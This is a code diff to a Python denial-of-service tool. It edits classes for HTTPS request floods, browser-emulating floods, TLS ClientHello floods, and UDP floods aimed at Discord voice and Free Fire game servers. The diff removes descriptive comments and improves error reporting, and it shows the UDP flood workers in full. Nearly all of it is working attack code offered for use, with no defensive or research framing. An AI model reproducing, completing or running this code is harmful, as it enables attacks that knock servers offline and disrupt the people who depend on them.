@@ -3,7 +3,6 @@ import asyncio
 import os
 import random
 import socket
-import ssl
 import threading
 import time
 
@@ -36,7 +35,7 @@ class CustomAttack:
 
 
 # ═══════════════════════════════════════════
-# HTTPS-BYPASS — curl_cffi TLS spoof
+# HTTPS-BYPASS
 # ═══════════════════════════════════════════
 class HTTPSBypass(CustomAttack):
     async def _worker(self, session, url):
@@ -68,7 +67,7 @@ class HTTPSBypass(CustomAttack):
 
 
 # ═══════════════════════════════════════════
-# HTTPS — massive RPS (fix H1: session reuse)
+# HTTPS
 # ═══════════════════════════════════════════
 class HTTPSMass(CustomAttack):
     async def _worker(self, session, url):
@@ -94,8 +93,7 @@ class HTTPSMass(CustomAttack):
             return
         url = self.target if self.target.startswith("http") \
               else f"https://{self.target}:{self.port}"
-        conn = aiohttp.TCPConnector(ssl=False, force_close=True,
-                                     limit=0)
+        conn = aiohttp.TCPConnector(ssl=False, force_close=True, limit=0)
         async with aiohttp.ClientSession(connector=conn) as s:
             tasks = [asyncio.create_task(self._worker(s, url))
                      for _ in range(self.threads)]
@@ -103,7 +101,7 @@ class HTTPSMass(CustomAttack):
 
 
 # ═══════════════════════════════════════════
-# DDOS-BROWSER — full browser emulation
+# DDOS-BROWSER
 # ═══════════════════════════════════════════
 class DdosBrowser(CustomAttack):
     HEADERS = {
@@ -151,7 +149,7 @@ class DdosBrowser(CustomAttack):
 
 
 # ═══════════════════════════════════════════
-# TLS — ClientHello flood
+# TLS
 # ═══════════════════════════════════════════
 class TLSAttack(CustomAttack):
     def _build_clienthello(self):
@@ -187,7 +185,7 @@ class TLSAttack(CustomAttack):
 
 
 # ═══════════════════════════════════════════
-# VC-DISCORD (fix M2: cap threads)
+# VC-DISCORD
 # ═══════════════════════════════════════════
 class VCDiscord(CustomAttack):
     def __init__(self, *args, **kwargs):
@@ -195,19 +193,25 @@ class VCDiscord(CustomAttack):
         self.threads = min(self.threads, 100)
 
     def _worker(self):
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
-        except Exception:
-            pass
+        except Exception as e:
+            self.stats["errors"] += 1
+            self.stats["last_error"] = str(e)
+            return
+
         pkt = random._urandom(1500)
         target = (self.target, self.port)
+
         while time.time() < self.stop_at:
             try:
                 s.sendto(pkt, target)
                 self.stats["hits"] += 1
-            except Exception:
+            except Exception as e:
                 self.stats["errors"] += 1
+                self.stats["last_error"] = str(e)
+
         try:
             s.close()
         except Exception:
@@ -221,7 +225,7 @@ class VCDiscord(CustomAttack):
 
 
 # ═══════════════════════════════════════════
-# FREEFIRE (fix M2: cap threads)
+# FREEFIRE
 # ═══════════════════════════════════════════
 class FreeFire(CustomAttack):
     def __init__(self, *args, **kwargs):
@@ -229,19 +233,25 @@ class FreeFire(CustomAttack):
         self.threads = min(self.threads, 100)
 
     def _worker(self):
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
-        except Exception:
-            pass
+        except Exception as e:
+            self.stats["errors"] += 1
+            self.stats["last_error"] = str(e)
+            return
+
         pkt = random._urandom(512)
         target = (self.target, self.port)
+
         while time.time() < self.stop_at:
             try:
                 s.sendto(pkt, target)
                 self.stats["hits"] += 1
-            except Exception:
+            except Exception as e:
                 self.stats["errors"] += 1
+                self.stats["last_error"] = str(e)
+
         try:
             s.close()
         except Exception:
